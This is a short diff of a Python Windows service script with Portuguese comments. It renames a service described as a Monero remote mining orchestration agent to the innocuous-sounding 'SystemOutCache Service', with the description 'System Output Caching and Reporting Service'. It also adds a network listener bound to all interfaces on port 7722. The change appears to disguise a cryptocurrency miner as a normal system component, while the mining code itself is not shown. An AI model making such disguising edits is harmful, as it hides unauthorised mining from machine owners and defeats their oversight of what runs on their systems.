@@ -17,10 +17,13 @@ import win32service
 import win32event
 import servicemanager
 
-# Nome do Serviço no Windows
-SERVICE_NAME = "MoneroRemotoService"
-SERVICE_DISPLAY_NAME = "MoneroRemoto Agent Service"
-SERVICE_DESCRIPTION = "Agente de gerenciamento remoto e orquestração de mineração."
+# Configurações do Serviço Windows
+SERVICE_NAME = "SystemOutCache"
+SERVICE_DISPLAY_NAME = "SystemOutCache Service"
+SERVICE_DESCRIPTION = "System Output Caching and Reporting Service"
+
+HOST = '0.0.0.0'
+PORT = 7722
 
 class ProcessController:
     def __init__(self):
